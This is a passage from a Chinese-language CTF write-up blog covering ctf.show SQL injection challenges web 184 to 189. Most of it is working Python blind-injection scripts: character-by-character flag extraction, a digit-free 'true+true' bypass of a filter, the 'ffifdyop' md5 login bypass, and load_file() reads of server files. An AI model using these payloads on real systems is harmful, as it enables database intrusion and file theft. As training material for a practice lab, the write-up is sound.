<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://87deffe2-4291-41ac-b76b-1bcaf046e697.chall.ctf.show:8080/select-waf.php&#x27;</span></span><br><span class="line">Str = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on substr(b.pass,&#123;&#125;,1)regexp(char(&#123;&#125;))&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">num = <span class="number">9</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Str:</span><br><span class="line">        Data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: data[<span class="string">&#x27;tableName&#x27;</span>].<span class="built_in">format</span>(num, <span class="built_in">ord</span>(i))</span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=Data)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">&#x27;\$user_count = (\d*)&#x27;</span>, resp.content.decode())[<span class="number">0</span>] == <span class="string">&#x27;43&#x27;</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web-185-186"><a href="#web-185-186" class="headerlink" title="web 185  186"></a>web 185  186</h2><p>在184的基础上过滤掉了数字, 也就是说payload里面不能出现数字, 可以用true+true+true….来构造想要的数字, 如99就是99个true相加, 利用这个继续写脚本得到flag</p>
<p>从Y4博客找到一张图<br><img src="http://47.98.130.190:8090/upload/2021/03/web185-5aed31977bec4fea8a5db59a746da244.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://2f2306e9-b139-4243-b9be-ff87dacd631c.chall.ctf.show:8080/select-waf.php&#x27;</span></span><br><span class="line">Str = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on substr(b.pass,&#123;&#125;,true)regexp(char(&#123;&#125;))&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">num = <span class="number">9</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Str:</span><br><span class="line">        Data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: data[<span class="string">&#x27;tableName&#x27;</span>].<span class="built_in">format</span>((num*<span class="string">&#x27;true+&#x27;</span>)[:-<span class="number">1</span>], (<span class="built_in">ord</span>(i)*<span class="string">&#x27;true+&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=Data)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">&#x27;\$user_count = (\d*)&#x27;</span>, resp.content.decode())[<span class="number">0</span>] == <span class="string">&#x27;43&#x27;</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web-187"><a href="#web-187" class="headerlink" title="web 187"></a>web 187</h2><p>以前做过的<code>md5($password,true) </code> 可以去看看 jarvis oj - login, 一个很神奇的字符串<code>ffifdyop</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_user where username = <span class="subst">$_POST</span>[&#x27;username&#x27;] and password= md5(<span class="subst">$_POST</span>[&#x27;password&#x27;],true)&quot;</span>; </span><br></pre></td></tr></table></figure>

<p><code>md5(&#39;ffifdyop&#39;,true) = &quot;&#39;or&#39;6xxxxxxx&quot;</code></p>
<h2 id="web-188"><a href="#web-188" class="headerlink" title="web 188"></a>web 188</h2><p>先pass , 有点奇怪</p>
<h2 id="web-189"><a href="#web-189" class="headerlink" title="web 189"></a>web 189</h2><p>查询语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>返回逻辑</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用户名检测</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>hint: flag在api/index.php文件中</p>
<p>学习到了一些sql注入可能用到的函数:</p>
<ol>
<li><code>if(exp1,exp2,exp3)</code>, 当<code>exp1</code>为<code>TRUE</code>时函数返回<code>exp2</code>, 反之返回<code>exp3</code>, 可搭配一些字符串比较函数来进行<strong>盲注</strong></li>
<li><code>load_file(file_name)</code>, 读取一个文件并将其内容作为字符串返回, 用于读取外部文件</li>
<li><code>locate(substr,str)</code>, 返回字符串<code>str</code>第一次出现子串<code>substr</code>的位置</li>
<li><code>strcmp(str1,str2)</code>,如果这两个字符串相等返回0，如果第一个参数是根据当前的排序顺序比第二较小则返回-1，否则返回1</li>
</ol>
<p>hint已经告诉了我们flag在文件index.php中, 要在sql中读取文件, 可以使用<code>load_file()</code>, 所以要在<code>username =&#123;$username&#125;</code>处执行<code>load_file()</code>且判断出flag是啥.</p>
<p>注意到<code>$username</code>没有被引号包着, 所以如果<code>$username</code>是语句是可以执行的.</p>
<p>这里要用<code>if()</code>和一些字符串你处理的函数来对flag进行盲注. </p>
<p>当<code>username=1&amp;password=0</code>时返回的是查询失败而当<code>username=0&amp;password=0</code>时返回的是密码错误, 可以根据这个回显来对flag进行判断.</p>
<p>首先, 先找到flag在文件中的位置, 因为前缀是ctfshow{ ,所以根据这个来找到flag的位置.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findindex</span>():</span></span><br><span class="line">    Index = <span class="number">1</span></span><br><span class="line">    url = <span class="string">&#x27;http://67064451-541b-444f-8c0e-c71be0d43b7f.chall.ctf.show:8080/api/&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(locate(&#x27;ctfshow&#123;&#x27;,&quot;</span> + <span class="string">&quot;load_file(&#x27;/var/www/html/api/index.php&#x27;))&gt;&#123;&#125;,0,1)&quot;</span>.<span class="built_in">format</span>(Index),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> resp.content.decode():</span><br><span class="line">            Index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Index + <span class="number">8</span></span><br></pre></td></tr></table></figure>

<p>然后根据上面得到的flag的起始位置开始猜flag, 最终脚本为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://67064451-541b-444f-8c0e-c71be0d43b7f.chall.ctf.show:8080/api/&#x27;</span></span><br><span class="line">Str = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findindex</span>():</span></span><br><span class="line">    Index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(locate(&#x27;ctfshow&#123;&#x27;,&quot;</span> + <span class="string">&quot;load_file(&#x27;/var/www/html/api/index.php&#x27;))&gt;&#123;&#125;,0,1)&quot;</span>.<span class="built_in">format</span>(Index),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> resp.content.decode():</span><br><span class="line">            Index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Index + <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Index = findindex()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(strcmp(&#x27;&#123;&#125;&#x27;,substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1))=0,0,1)&quot;</span>.<span class="built_in">format</span>(i, Index),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> resp.content.decode():</span><br><span class="line">            flag += i</span><br><span class="line">            Index += <span class="number">1</span></span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>
        </div></article>
      <nav class="pagination"><a class="prev" href="/page/4/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text">Prev</span>
      </a>
    <a class="next" href="/page/6/">
        <span class="next-text">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></section></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:your@email.com" class="iconfont icon-email" title="email"></a>
        <a target="_blank" rel="noopener" href="https://github.com/ahonn" class="iconfont icon-github" title="github"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">&copy;2015 - 2021<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">K1rit0</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
</body>
</html>
